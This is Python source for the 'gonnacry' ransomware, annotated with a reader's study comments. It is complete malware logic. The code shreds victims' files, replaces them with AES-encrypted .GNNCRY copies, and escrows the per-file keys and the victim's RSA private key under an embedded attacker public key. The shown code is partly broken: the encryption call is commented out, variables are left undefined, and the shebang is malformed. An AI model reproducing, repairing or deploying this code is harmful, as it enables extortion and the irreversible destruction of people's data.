#!/bin/bash/env python
# coding=UTF-8

import os
import string
import random
import asymmetric
import get_files
import symmetric
import enviroment
import generate_keys
from Crypto.PublicKey import RSA
import gc
from Crypto.Hash import MD5
import base64
import pickle
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

# const variables
# I guess this is the public key of the attacker. 
server_public_key = ("""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
RNZVegpnmGQCSRPlkfjN0TjfCFjaUX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr
36BLaswJo1zbzhctK2SYX+Miov04D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL0
4T1+tQXaGujLzc3QxJN3wo8rWkQ4CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3Asc
XAQNI94ZPaqD6e2rWcSy2ZMiKVJgCWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5v
DQIDAQAB
-----END PUBLIC KEY-----""")

# enviroment paths
ransomware_name = "gonnacry"
home = enviroment.get_home_path()
home = home + "/test"
# desktop = enviroment.get_desktop_path()
# username = enviroment.get_username()
ransomware_path = os.path.join(home, ransomware_name)

def encrypt_priv_key(msg, key):
    line = msg
    n = 127
    x = [line[i:i+n] for i in range(0, len(line), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    cifrado = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        cifrado.append(ciphertext)
    return cifrado

'''
    By defualt, passes=1, that means, the for loop below will execute
    once and only once. 

'''
def shred(file_name,  passes=1):

    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        # return a string containing randon characters.
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    # execute once to generate data and write to the file. 
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)

'''
    encrypt all files. 
    returns a list.
    Each element in the list is a tuple. 
    The tuple contains a symmentric key and the encoded file path, which is encrypted by that key.
    
    The idea is to put some random content at the beginning, and then write encrypted content at the end. 
    This may reduce entropy. 

'''
def start_encryption(files):
    AES_and_base64_path = []
    for found_file in files:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file = base64.b64decode(found_file)

        # try open the file to encrypt it
        try:
            with open(found_file, 'rb') as f:
                file_content = f.read()
        except:
            continue

        encrypted = AES_obj.encrypt(file_content)
        # destroyed found_file. That is, replace it with random chars. 
        shred(found_file)

        # append the encrypted one at the end. 
        new_file_name = found_file + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name)

        # list of tuples of AES_key and base64(path)
        AES_and_base64_path.append((key, base64_new_file_name))
    
    return AES_and_base64_path




def menu():

    # create ransomware directory 
    try:
        os.mkdir(ransomware_path, 0o700)
    except OSError:
        pass

    # get the files in the home directory
    # /home/$USER
    files = get_files.find_files(home)


    # create RSA object
    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    # Here is the public key of the attacker. 
    server_public_key_object = RSA.importKey(server_public_key)
    
    # Get victim's private key
    Client_private_key = rsa_object.private_key_PEM
    # Get victim's public key
    Client_public_key = rsa_object.public_key_PEM
    # encryp victim's private key & attacker's public key with attacker's public key.
    # So, only attacker can read them. 
    # I don't know why server_public_key is included. Maybe, the server side need this info later.  
    encrypted_client_private_key = encrypt_priv_key(Client_private_key, server_public_key)
    
    # save encrypted client private key to disk
    with open(ransomware_path + '/encrypted_client_private_key.key', 'wb') as output:
        # serialize and write to the file. 
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
    
    # save client public key to disk
    with open(ransomware_path + "/client_public_key.PEM", 'wb') as f:
        f.write(Client_public_key)
    
    # Free the memory from keys
    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()
    
    # Get the client public key back as object
    client_public_key_object =  RSA.importKey(Client_public_key)
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)


    # FILE ENCRYPTION STARTS HERE !!!
    # aes_keys_and_base64_path = start_encryption(files)
    # enc_aes_key_and_base64_path = []
    

    # The aes_keys_and_based_64_path is a list of tuples. 
    # Each tuple is a (key, path) pair. 
    # That is, each compromised file associated with an individual key. 
    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        # encrypt with the client public key. For signature purpose. 
        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
        # So, you got lots of key,path pairs signed. 
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
    
    # free the old AES keys
    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    # save to disk -> ENC(AES) BASE64(PATH)
    with open(ransomware_path + "/AES_encrypted_keys.txt", 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()

    

    

if __name__ == "__main__":
    menu()
    # change_wallpaper()
    # drop_daemon_and_decryptor()

